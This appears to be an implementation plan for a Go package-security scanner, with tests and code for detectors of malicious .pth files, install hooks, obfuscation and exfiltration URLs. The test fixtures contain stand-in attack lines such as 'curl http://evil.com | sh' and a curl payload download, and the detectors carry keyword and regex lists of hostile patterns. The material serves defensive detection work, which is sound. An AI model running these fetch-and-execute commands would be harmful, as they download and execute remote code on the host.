# Shieldoo Gate v1.0 Core — Phase 2: Scanner Engine + Built-in Scanners

> **For agentic workers:** REQUIRED SUB-SKILL: Use cf-powers:subagent-driven-development (recommended) or cf-powers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Implement the scanner engine that orchestrates parallel scanning, plus all 6 built-in Go scanners (PTH Inspector, Install Hook Analyzer, Obfuscation Detector, Exfil Detector, Hash Verifier, Threat Feed Checker).

**Architecture:** The `Engine` holds a slice of `Scanner` implementations and runs them in parallel using goroutines with a shared context for timeout. Each built-in scanner implements the `Scanner` interface from `internal/scanner/interface.go`. Scanners that fail return `VerdictClean` + error (fail-open design). The engine collects all results; aggregation happens later in the policy engine (Phase 4).

**Tech Stack:** Go 1.23+, `sync` (goroutines/WaitGroup), `archive/zip`/`archive/tar` (artifact extraction), `regexp` (pattern matching), testify

**Index:** [`plan-index.md`](./2026-03-25-v1-core-plan-index.md)

---

### Task 1: Scanner Engine (Parallel Orchestration)

**Files:**
- Create: `internal/scanner/engine.go`
- Test: `internal/scanner/engine_test.go`

- [ ] **Step 1: Write tests for scanner engine**

```go
// internal/scanner/engine_test.go
package scanner

import (
    "context"
    "errors"
    "testing"
    "time"

    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

// mockScanner implements Scanner for testing
type mockScanner struct {
    name       string
    ecosystems []Ecosystem
    scanFn     func(ctx context.Context, artifact Artifact) (ScanResult, error)
    healthFn   func(ctx context.Context) error
}

func (m *mockScanner) Name() string                      { return m.name }
func (m *mockScanner) Version() string                   { return "1.0.0-test" }
func (m *mockScanner) SupportedEcosystems() []Ecosystem  { return m.ecosystems }
func (m *mockScanner) Scan(ctx context.Context, a Artifact) (ScanResult, error) {
    return m.scanFn(ctx, a)
}
func (m *mockScanner) HealthCheck(ctx context.Context) error {
    if m.healthFn != nil {
        return m.healthFn(ctx)
    }
    return nil
}

func TestEngine_ScanAll_RunsAllMatchingScanners(t *testing.T) {
    s1 := &mockScanner{
        name:       "scanner1",
        ecosystems: []Ecosystem{EcosystemPyPI},
        scanFn: func(_ context.Context, _ Artifact) (ScanResult, error) {
            return ScanResult{Verdict: VerdictClean, Confidence: 1.0, ScannerID: "scanner1"}, nil
        },
    }
    s2 := &mockScanner{
        name:       "scanner2",
        ecosystems: []Ecosystem{EcosystemPyPI, EcosystemNPM},
        scanFn: func(_ context.Context, _ Artifact) (ScanResult, error) {
            return ScanResult{Verdict: VerdictSuspicious, Confidence: 0.8, ScannerID: "scanner2"}, nil
        },
    }

    engine := NewEngine([]Scanner{s1, s2}, 30*time.Second)
    results, err := engine.ScanAll(context.Background(), Artifact{Ecosystem: EcosystemPyPI})
    require.NoError(t, err)
    assert.Len(t, results, 2)
}

func TestEngine_ScanAll_FiltersUnsupportedEcosystem(t *testing.T) {
    s := &mockScanner{
        name:       "pypi-only",
        ecosystems: []Ecosystem{EcosystemPyPI},
        scanFn: func(_ context.Context, _ Artifact) (ScanResult, error) {
            return ScanResult{Verdict: VerdictClean}, nil
        },
    }

    engine := NewEngine([]Scanner{s}, 30*time.Second)
    results, err := engine.ScanAll(context.Background(), Artifact{Ecosystem: EcosystemDocker})
    require.NoError(t, err)
    assert.Len(t, results, 0)
}

func TestEngine_ScanAll_Timeout_ReturnsErrorNotMalicious(t *testing.T) {
    slow := &mockScanner{
        name:       "slow",
        ecosystems: []Ecosystem{EcosystemPyPI},
        scanFn: func(ctx context.Context, _ Artifact) (ScanResult, error) {
            select {
            case <-ctx.Done():
                return ScanResult{}, ctx.Err()
            case <-time.After(5 * time.Second):
                return ScanResult{Verdict: VerdictClean}, nil
            }
        },
    }

    engine := NewEngine([]Scanner{slow}, 50*time.Millisecond)
    results, err := engine.ScanAll(context.Background(), Artifact{Ecosystem: EcosystemPyPI})
    require.NoError(t, err)
    assert.Len(t, results, 1)
    // Fail-open: timed-out scanner returns CLEAN with error, NOT MALICIOUS
    assert.Equal(t, VerdictClean, results[0].Verdict)
    assert.NotNil(t, results[0].Error)
}

func TestEngine_ScanAll_ScannerError_FailsOpen(t *testing.T) {
    failing := &mockScanner{
        name:       "failing",
        ecosystems: []Ecosystem{EcosystemPyPI},
        scanFn: func(_ context.Context, _ Artifact) (ScanResult, error) {
            return ScanResult{}, errors.New("scanner crashed")
        },
    }

    engine := NewEngine([]Scanner{failing}, 30*time.Second)
    results, err := engine.ScanAll(context.Background(), Artifact{Ecosystem: EcosystemPyPI})
    require.NoError(t, err)
    assert.Len(t, results, 1)
    assert.Equal(t, VerdictClean, results[0].Verdict)
    assert.NotNil(t, results[0].Error)
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/scanner/ -v -run TestEngine`
Expected: FAIL — `NewEngine` not defined.

- [ ] **Step 3: Implement Engine**

```go
// internal/scanner/engine.go
package scanner

import (
    "context"
    "sync"
    "time"
)

type Engine struct {
    scanners []Scanner
    timeout  time.Duration
}

func NewEngine(scanners []Scanner, timeout time.Duration) *Engine {
    return &Engine{
        scanners: scanners,
        timeout:  timeout,
    }
}

func (e *Engine) ScanAll(ctx context.Context, artifact Artifact) ([]ScanResult, error) {
    // Filter scanners that support this ecosystem
    var applicable []Scanner
    for _, s := range e.scanners {
        for _, eco := range s.SupportedEcosystems() {
            if eco == artifact.Ecosystem {
                applicable = append(applicable, s)
                break
            }
        }
    }

    if len(applicable) == 0 {
        return nil, nil
    }

    scanCtx, cancel := context.WithTimeout(ctx, e.timeout)
    defer cancel()

    var mu sync.Mutex
    results := make([]ScanResult, 0, len(applicable))
    var wg sync.WaitGroup

    for _, s := range applicable {
        wg.Add(1)
        go func(sc Scanner) {
            defer wg.Done()
            start := time.Now()
            result, err := sc.Scan(scanCtx, artifact)
            if err != nil {
                // Fail-open: scanner failure returns CLEAN, never MALICIOUS
                result = ScanResult{
                    Verdict:   VerdictClean,
                    ScannerID: sc.Name(),
                    Error:     err,
                }
            }
            result.Duration = time.Since(start)
            result.ScannedAt = start
            if result.ScannerID == "" {
                result.ScannerID = sc.Name()
            }

            mu.Lock()
            results = append(results, result)
            mu.Unlock()
        }(s)
    }

    wg.Wait()
    return results, nil
}

func (e *Engine) HealthCheck(ctx context.Context) map[string]error {
    status := make(map[string]error)
    for _, s := range e.scanners {
        status[s.Name()] = s.HealthCheck(ctx)
    }
    return status
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/scanner/ -v -run TestEngine`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/engine.go internal/scanner/engine_test.go
git commit -m "feat(scanner): add parallel scanner engine with fail-open design"
```

---

### Task 2: PTH Inspector (Built-in Scanner)

**Files:**
- Create: `internal/scanner/builtin/pth_inspector.go`
- Test: `internal/scanner/builtin/pth_inspector_test.go`

Detects `.pth` files with executable code — the exact LiteLLM attack vector. A `.pth` file containing `import` statements or code beyond a simple path is suspicious/malicious.

- [ ] **Step 1: Write tests**

```go
// internal/scanner/builtin/pth_inspector_test.go
package builtin

import (
    "archive/zip"
    "context"
    "os"
    "path/filepath"
    "testing"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

func createTestWhl(t *testing.T, files map[string]string) string {
    t.Helper()
    dir := t.TempDir()
    whlPath := filepath.Join(dir, "test-1.0.0-py3-none-any.whl")
    f, err := os.Create(whlPath)
    require.NoError(t, err)
    w := zip.NewWriter(f)
    for name, content := range files {
        fw, err := w.Create(name)
        require.NoError(t, err)
        _, err = fw.Write([]byte(content))
        require.NoError(t, err)
    }
    require.NoError(t, w.Close())
    require.NoError(t, f.Close())
    return whlPath
}

func TestPTHInspector_MaliciousPTH_ReturnsMalicious(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "evil.pth": "import os; os.system('curl http://evil.com | sh')",
    })
    s := NewPTHInspector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
    assert.NotEmpty(t, result.Findings)
    assert.Equal(t, "evil.pth", result.Findings[0].Location)
}

func TestPTHInspector_CleanPackage_ReturnsClean(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "setup.py": "from setuptools import setup; setup(name='clean')",
        "clean/__init__.py": "",
    })
    s := NewPTHInspector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}

func TestPTHInspector_SafePTH_ReturnsClean(t *testing.T) {
    // A .pth file with just a path is safe
    whl := createTestWhl(t, map[string]string{
        "safe.pth": "./src",
    })
    s := NewPTHInspector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}

func TestPTHInspector_SupportedEcosystems_OnlyPyPI(t *testing.T) {
    s := NewPTHInspector()
    assert.Equal(t, []scanner.Ecosystem{scanner.EcosystemPyPI}, s.SupportedEcosystems())
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/scanner/builtin/ -v -run TestPTHInspector`
Expected: FAIL

- [ ] **Step 3: Implement PTH Inspector**

```go
// internal/scanner/builtin/pth_inspector.go
package builtin

import (
    "archive/zip"
    "context"
    "io"
    "path/filepath"
    "strings"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
)

type PTHInspector struct{}

func NewPTHInspector() *PTHInspector {
    return &PTHInspector{}
}

func (p *PTHInspector) Name() string    { return "builtin-pth-inspector" }
func (p *PTHInspector) Version() string { return "1.0.0" }
func (p *PTHInspector) SupportedEcosystems() []scanner.Ecosystem {
    return []scanner.Ecosystem{scanner.EcosystemPyPI}
}

func (p *PTHInspector) HealthCheck(_ context.Context) error { return nil }

func (p *PTHInspector) Scan(_ context.Context, artifact scanner.Artifact) (scanner.ScanResult, error) {
    r, err := zip.OpenReader(artifact.LocalPath)
    if err != nil {
        return scanner.ScanResult{Verdict: scanner.VerdictClean, ScannerID: p.Name(), Error: err}, nil
    }
    defer r.Close()

    var findings []scanner.Finding
    for _, f := range r.File {
        if filepath.Ext(f.Name) != ".pth" {
            continue
        }
        rc, err := f.Open()
        if err != nil {
            continue
        }
        content, err := io.ReadAll(rc)
        rc.Close()
        if err != nil {
            continue
        }

        lines := strings.Split(string(content), "\n")
        for _, line := range lines {
            line = strings.TrimSpace(line)
            if line == "" {
                continue
            }
            if isPTHExecutable(line) {
                findings = append(findings, scanner.Finding{
                    Severity:    scanner.SeverityCritical,
                    Category:    "pth-executable-code",
                    Description: "PTH file contains executable Python code",
                    Location:    f.Name,
                    IoCs:        []string{line},
                })
            }
        }
    }

    if len(findings) > 0 {
        return scanner.ScanResult{
            Verdict:    scanner.VerdictMalicious,
            Confidence: 0.95,
            Findings:   findings,
            ScannerID:  p.Name(),
        }, nil
    }

    return scanner.ScanResult{
        Verdict:    scanner.VerdictClean,
        Confidence: 1.0,
        ScannerID:  p.Name(),
    }, nil
}

func isPTHExecutable(line string) bool {
    // A .pth line starting with "import" is executable code
    if strings.HasPrefix(line, "import ") || strings.HasPrefix(line, "import\t") {
        return true
    }
    // Lines with semicolons often chain commands: import os; os.system(...)
    if strings.Contains(line, ";") && strings.Contains(line, "import") {
        return true
    }
    // exec(), eval(), __import__ are red flags
    for _, keyword := range []string{"exec(", "eval(", "__import__", "os.system", "subprocess"} {
        if strings.Contains(line, keyword) {
            return true
        }
    }
    return false
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/scanner/builtin/ -v -run TestPTHInspector`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/builtin/pth_inspector.go internal/scanner/builtin/pth_inspector_test.go
git commit -m "feat(scanner): add PTH Inspector built-in scanner for .pth file detection"
```

---

### Task 3: Install Hook Analyzer (Built-in Scanner)

**Files:**
- Create: `internal/scanner/builtin/install_hook.go`
- Test: `internal/scanner/builtin/install_hook_test.go`

Detects suspicious `setup.py` hooks (PyPI) and `postinstall` scripts (npm).

**Important:** PyPI packages are ZIP files (.whl, .tar.gz with zip header). npm packages are `.tgz` files (tar+gzip). The implementation must handle both formats: use `archive/zip` for PyPI and `archive/tar` + `compress/gzip` for npm. The `Scan` method should detect format by file extension or magic bytes and dispatch to the correct reader.

- [ ] **Step 1: Write tests**

```go
// internal/scanner/builtin/install_hook_test.go
package builtin

import (
    "context"
    "testing"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

func TestInstallHookAnalyzer_SuspiciousSetupPy_ReturnsSuspicious(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "setup.py": `
from setuptools import setup
import subprocess
subprocess.Popen(['curl', 'http://evil.com/payload', '-o', '/tmp/x'])
setup(name='evil')
`,
    })
    s := NewInstallHookAnalyzer()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictSuspicious, result.Verdict)
    assert.NotEmpty(t, result.Findings)
}

func TestInstallHookAnalyzer_CleanSetupPy_ReturnsClean(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "setup.py": `from setuptools import setup; setup(name='clean', version='1.0')`,
    })
    s := NewInstallHookAnalyzer()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}

func TestInstallHookAnalyzer_NPMPostinstall_ReturnsSuspicious(t *testing.T) {
    // For npm we'll check package.json for postinstall scripts with suspicious commands
    // npm tarballs are .tgz files — for unit test we use a zip mock with package.json
    whl := createTestWhl(t, map[string]string{
        "package/package.json": `{
            "name": "evil",
            "scripts": {
                "postinstall": "curl http://evil.com | sh"
            }
        }`,
    })
    s := NewInstallHookAnalyzer()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemNPM,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictSuspicious, result.Verdict)
}

func TestInstallHookAnalyzer_SupportedEcosystems(t *testing.T) {
    s := NewInstallHookAnalyzer()
    eco := s.SupportedEcosystems()
    assert.Contains(t, eco, scanner.EcosystemPyPI)
    assert.Contains(t, eco, scanner.EcosystemNPM)
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/scanner/builtin/ -v -run TestInstallHookAnalyzer`
Expected: FAIL

- [ ] **Step 3: Implement Install Hook Analyzer**

```go
// internal/scanner/builtin/install_hook.go
package builtin

import (
    "archive/zip"
    "context"
    "encoding/json"
    "io"
    "path/filepath"
    "strings"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
)

type InstallHookAnalyzer struct{}

func NewInstallHookAnalyzer() *InstallHookAnalyzer {
    return &InstallHookAnalyzer{}
}

func (a *InstallHookAnalyzer) Name() string    { return "builtin-install-hook" }
func (a *InstallHookAnalyzer) Version() string { return "1.0.0" }
func (a *InstallHookAnalyzer) SupportedEcosystems() []scanner.Ecosystem {
    return []scanner.Ecosystem{scanner.EcosystemPyPI, scanner.EcosystemNPM}
}
func (a *InstallHookAnalyzer) HealthCheck(_ context.Context) error { return nil }

var suspiciousPatterns = []string{
    "subprocess", "os.system", "Popen", "exec(",
    "eval(", "compile(", "__import__",
    "curl ", "wget ", "powershell",
    "socket.connect", "urllib.request",
}

func (a *InstallHookAnalyzer) Scan(_ context.Context, artifact scanner.Artifact) (scanner.ScanResult, error) {
    r, err := zip.OpenReader(artifact.LocalPath)
    if err != nil {
        return scanner.ScanResult{Verdict: scanner.VerdictClean, ScannerID: a.Name(), Error: err}, nil
    }
    defer r.Close()

    var findings []scanner.Finding

    for _, f := range r.File {
        switch artifact.Ecosystem {
        case scanner.EcosystemPyPI:
            if filepath.Base(f.Name) == "setup.py" {
                findings = append(findings, a.checkPySetup(f)...)
            }
        case scanner.EcosystemNPM:
            if filepath.Base(f.Name) == "package.json" {
                findings = append(findings, a.checkNPMPackageJSON(f)...)
            }
        }
    }

    if len(findings) > 0 {
        return scanner.ScanResult{
            Verdict:    scanner.VerdictSuspicious,
            Confidence: 0.8,
            Findings:   findings,
            ScannerID:  a.Name(),
        }, nil
    }

    return scanner.ScanResult{
        Verdict:    scanner.VerdictClean,
        Confidence: 1.0,
        ScannerID:  a.Name(),
    }, nil
}

func (a *InstallHookAnalyzer) checkPySetup(f *zip.File) []scanner.Finding {
    rc, err := f.Open()
    if err != nil {
        return nil
    }
    defer rc.Close()

    content, err := io.ReadAll(rc)
    if err != nil {
        return nil
    }

    var findings []scanner.Finding
    text := string(content)
    for _, pattern := range suspiciousPatterns {
        if strings.Contains(text, pattern) {
            findings = append(findings, scanner.Finding{
                Severity:    scanner.SeverityHigh,
                Category:    "suspicious-install-hook",
                Description: "setup.py contains suspicious pattern: " + pattern,
                Location:    f.Name,
            })
        }
    }
    return findings
}

func (a *InstallHookAnalyzer) checkNPMPackageJSON(f *zip.File) []scanner.Finding {
    rc, err := f.Open()
    if err != nil {
        return nil
    }
    defer rc.Close()

    content, err := io.ReadAll(rc)
    if err != nil {
        return nil
    }

    var pkg struct {
        Scripts map[string]string `json:"scripts"`
    }
    if err := json.Unmarshal(content, &pkg); err != nil {
        return nil
    }

    var findings []scanner.Finding
    lifecycleHooks := []string{"preinstall", "install", "postinstall", "preuninstall", "postuninstall"}
    for _, hook := range lifecycleHooks {
        script, ok := pkg.Scripts[hook]
        if !ok {
            continue
        }
        for _, pattern := range suspiciousPatterns {
            if strings.Contains(script, pattern) {
                findings = append(findings, scanner.Finding{
                    Severity:    scanner.SeverityHigh,
                    Category:    "suspicious-install-hook",
                    Description: hook + " script contains suspicious pattern: " + pattern,
                    Location:    f.Name,
                })
            }
        }
    }
    return findings
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/scanner/builtin/ -v -run TestInstallHookAnalyzer`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/builtin/install_hook.go internal/scanner/builtin/install_hook_test.go
git commit -m "feat(scanner): add Install Hook Analyzer for setup.py and postinstall detection"
```

---

### Task 4: Obfuscation Detector (Built-in Scanner)

**Files:**
- Create: `internal/scanner/builtin/obfuscation.go`
- Test: `internal/scanner/builtin/obfuscation_test.go`

Detects `base64.decode(exec(...))`, packed JS, encrypted blobs across all ecosystems.

- [ ] **Step 1: Write tests**

```go
// internal/scanner/builtin/obfuscation_test.go
package builtin

import (
    "context"
    "testing"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

func TestObfuscationDetector_Base64Exec_ReturnsMalicious(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "evil.py": `import base64; exec(base64.b64decode("aW1wb3J0IG9z"))`,
    })
    s := NewObfuscationDetector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictMalicious, result.Verdict)
}

func TestObfuscationDetector_EvalAtob_ReturnsSuspicious(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "index.js": `eval(atob("YWxlcnQoMSk="))`,
    })
    s := NewObfuscationDetector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemNPM,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.True(t, result.Verdict == scanner.VerdictMalicious || result.Verdict == scanner.VerdictSuspicious)
}

func TestObfuscationDetector_CleanCode_ReturnsClean(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "clean.py": `print("hello world")`,
    })
    s := NewObfuscationDetector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}

func TestObfuscationDetector_SupportedEcosystems_All(t *testing.T) {
    s := NewObfuscationDetector()
    eco := s.SupportedEcosystems()
    assert.Contains(t, eco, scanner.EcosystemPyPI)
    assert.Contains(t, eco, scanner.EcosystemNPM)
    assert.Contains(t, eco, scanner.EcosystemDocker)
    assert.Contains(t, eco, scanner.EcosystemNuGet)
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/scanner/builtin/ -v -run TestObfuscationDetector`
Expected: FAIL

- [ ] **Step 3: Implement Obfuscation Detector**

```go
// internal/scanner/builtin/obfuscation.go
package builtin

import (
    "archive/zip"
    "context"
    "io"
    "regexp"
    "strings"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
)

type ObfuscationDetector struct{}

func NewObfuscationDetector() *ObfuscationDetector {
    return &ObfuscationDetector{}
}

func (d *ObfuscationDetector) Name() string    { return "builtin-obfuscation" }
func (d *ObfuscationDetector) Version() string { return "1.0.0" }
func (d *ObfuscationDetector) SupportedEcosystems() []scanner.Ecosystem {
    return []scanner.Ecosystem{scanner.EcosystemPyPI, scanner.EcosystemNPM, scanner.EcosystemDocker, scanner.EcosystemNuGet}
}
func (d *ObfuscationDetector) HealthCheck(_ context.Context) error { return nil }

var obfuscationPatterns = []*regexp.Regexp{
    regexp.MustCompile(`exec\s*\(\s*base64`),
    regexp.MustCompile(`exec\s*\(\s*.*b64decode`),
    regexp.MustCompile(`eval\s*\(\s*atob\s*\(`),
    regexp.MustCompile(`eval\s*\(\s*Buffer\.from\s*\(`),
    regexp.MustCompile(`eval\s*\(\s*.*fromCharCode`),
    regexp.MustCompile(`compile\s*\(\s*base64`),
    regexp.MustCompile(`__import__\s*\(\s*['"]base64['"]\s*\).*exec`),
}

var codeExtensions = map[string]bool{
    ".py": true, ".js": true, ".mjs": true, ".cjs": true,
    ".ts": true, ".sh": true, ".ps1": true, ".bat": true,
    ".rb": true, ".pl": true, ".cs": true,
}

func (d *ObfuscationDetector) Scan(_ context.Context, artifact scanner.Artifact) (scanner.ScanResult, error) {
    r, err := zip.OpenReader(artifact.LocalPath)
    if err != nil {
        return scanner.ScanResult{Verdict: scanner.VerdictClean, ScannerID: d.Name(), Error: err}, nil
    }
    defer r.Close()

    var findings []scanner.Finding
    for _, f := range r.File {
        ext := strings.ToLower(fileExt(f.Name))
        if !codeExtensions[ext] {
            continue
        }
        if f.UncompressedSize64 > 10*1024*1024 { // skip files > 10MB
            continue
        }

        rc, err := f.Open()
        if err != nil {
            continue
        }
        content, err := io.ReadAll(rc)
        rc.Close()
        if err != nil {
            continue
        }

        text := string(content)
        for _, pattern := range obfuscationPatterns {
            if pattern.MatchString(text) {
                findings = append(findings, scanner.Finding{
                    Severity:    scanner.SeverityCritical,
                    Category:    "obfuscation",
                    Description: "Obfuscated code pattern detected: " + pattern.String(),
                    Location:    f.Name,
                })
            }
        }
    }

    if len(findings) > 0 {
        return scanner.ScanResult{
            Verdict:    scanner.VerdictMalicious,
            Confidence: 0.9,
            Findings:   findings,
            ScannerID:  d.Name(),
        }, nil
    }

    return scanner.ScanResult{
        Verdict:    scanner.VerdictClean,
        Confidence: 1.0,
        ScannerID:  d.Name(),
    }, nil
}

func fileExt(name string) string {
    for i := len(name) - 1; i >= 0; i-- {
        if name[i] == '.' {
            return name[i:]
        }
        if name[i] == '/' {
            break
        }
    }
    return ""
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/scanner/builtin/ -v -run TestObfuscationDetector`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/builtin/obfuscation.go internal/scanner/builtin/obfuscation_test.go
git commit -m "feat(scanner): add Obfuscation Detector for base64+exec, eval+atob patterns"
```

---

### Task 5: Exfil Detector (Built-in Scanner)

**Files:**
- Create: `internal/scanner/builtin/exfil_detector.go`
- Test: `internal/scanner/builtin/exfil_detector_test.go`

Detects HTTP calls to non-registry domains at install time.

- [ ] **Step 1: Write tests**

```go
// internal/scanner/builtin/exfil_detector_test.go
package builtin

import (
    "context"
    "testing"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
)

func TestExfilDetector_SuspiciousURL_ReturnsSuspicious(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "evil.py": `import urllib.request; urllib.request.urlopen("http://evil.com/steal")`,
    })
    s := NewExfilDetector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictSuspicious, result.Verdict)
    assert.NotEmpty(t, result.Findings)
}

func TestExfilDetector_RegistryURL_ReturnsClean(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "setup.py": `# downloads from https://pypi.org/simple/ during install`,
    })
    s := NewExfilDetector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}

func TestExfilDetector_NoURLs_ReturnsClean(t *testing.T) {
    whl := createTestWhl(t, map[string]string{
        "clean.py": `print("no network calls")`,
    })
    s := NewExfilDetector()
    result, err := s.Scan(context.Background(), scanner.Artifact{
        Ecosystem: scanner.EcosystemPyPI,
        LocalPath: whl,
    })
    require.NoError(t, err)
    assert.Equal(t, scanner.VerdictClean, result.Verdict)
}
```

- [ ] **Step 2: Run tests to verify they fail**

Run: `go test ./internal/scanner/builtin/ -v -run TestExfilDetector`
Expected: FAIL

- [ ] **Step 3: Implement Exfil Detector**

```go
// internal/scanner/builtin/exfil_detector.go
package builtin

import (
    "archive/zip"
    "context"
    "io"
    "net/url"
    "regexp"
    "strings"

    "github.com/cloudfieldcz/shieldoo-gate/internal/scanner"
)

type ExfilDetector struct{}

func NewExfilDetector() *ExfilDetector {
    return &ExfilDetector{}
}

func (d *ExfilDetector) Name() string    { return "builtin-exfil-detector" }
func (d *ExfilDetector) Version() string { return "1.0.0" }
func (d *ExfilDetector) SupportedEcosystems() []scanner.Ecosystem {
    return []scanner.Ecosystem{scanner.EcosystemPyPI, scanner.EcosystemNPM, scanner.EcosystemDocker, scanner.EcosystemNuGet}
}
func (d *ExfilDetector) HealthCheck(_ context.Context) error { return nil }

var urlPattern = regexp.MustCompile(`https?://[^\s"'\)\]>]+`)

// Known safe domains that packages legitimately reference
var safeDomains = map[string]bool{
    "pypi.org":              true,
    "files.pythonhosted.org": true,
    "registry.npmjs.org":    true,
    "api.nuget.org":         true,
    "registry-1.docker.io":  true,
    "github.com":            true,
    "gitlab.com":            true,
    "bitbucket.org":         true,
    "golang.org":            true,
    "pkg.go.dev":            true,
    "docs.python.org":       true,
    "nodejs.org":            true,
    "www.python.org":        true,
    "opensource.org":        true,
    "creativecommons.org":   true,
    "www.apache.org":        true,
    "www.mozilla.org":       true,
    "readthedocs.io":        true,
    "readthedocs.org":       true,
    "shields.io":            true,
    "badge.fury.io":         true,
    "img.shields.io":        true,
    "codecov.io":            true,
    "coveralls.io":          true,
    "travis-ci.org":         true,
    "circleci.com":          true,
}

func (d *ExfilDetector) Scan(_ context.Context, artifact scanner.Artifact) (scanner.ScanResult, error) {
    r, err := zip.OpenReader(artifact.LocalPath)
    if err != nil {
        return scanner.ScanResult{Verdict: scanner.VerdictClean, ScannerID: d.Name(), Error: err}, nil
    }
    defer r.Close()

    var findings []scanner.Finding
    for _, f := range r.File {
        ext := strings.ToLower(fileExt(f.Name))
        if !codeExtensions[ext] {
            continue
        }
        if f.UncompressedSize64 > 10*1024*1024 {
            continue
        }

        rc, err := f.Open()
        if err != nil {
            continue
        }
        content, err := io.ReadAll(rc)
        rc.Close()
        if err != nil {
            continue
        }

        urls := urlPattern.FindAllString(string(content), -1)
        for _, u := range urls {
            parsed, err := url.Parse(u)
            if err != nil {
                continue
            }
            host := strings.TrimPrefix(parsed.Hostname(), "www.")
            if !isSafeDomain(host) {
                findings = append(findings, scanner.Finding{
                    Severity:    scanner.SeverityMedium,
                    Category:    "network-exfiltration",
                    Description: "Code references external URL: " + u,
                    Location:    f.Name,
                    IoCs:        []string{u},
                })
            }
        }
    }

    if len(findings) > 0 {
        return scanner.ScanResult{
            Verdict:    scanner.VerdictSuspicious,
            Confidence: 0.6,
            Findings:   findings,
            ScannerID:  d.Name(),
        }, nil
    }

    return scanner.ScanResult{
        Verdict:    scanner.VerdictClean,
        Confidence: 1.0,
        ScannerID:  d.Name(),
    }, nil
}

func isSafeDomain(host string) bool {
    if safeDomains[host] {
        return true
    }
    // Check parent domains (e.g., "foo.readthedocs.io")
    parts := strings.SplitN(host, ".", 2)
    if len(parts) == 2 {
        return safeDomains[parts[1]]
    }
    return false
}
```

- [ ] **Step 4: Run tests to verify they pass**

Run: `go test ./internal/scanner/builtin/ -v -run TestExfilDetector`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add internal/scanner/builtin/exfil_detector.go internal/scanner/builtin/exfil_detector_test.go
git commit -m "feat(scanner): add Exfil Detector for non-registry URL detection"
```

---

### Task 6: Hash Verifier (Built-in Scanner)

**Files:**
- Create: `internal/scanner/builtin/hash_verifier.go`
- Test: `internal/scanner/builtin/hash_verifier_test.go`

Verifies artifact SHA256 matches the expected hash from the upstream registry.

- [ ] **Step 1: Write tests**

```go
// internal/scanner/builtin/hash_verifier_test.go
package builtin

import (
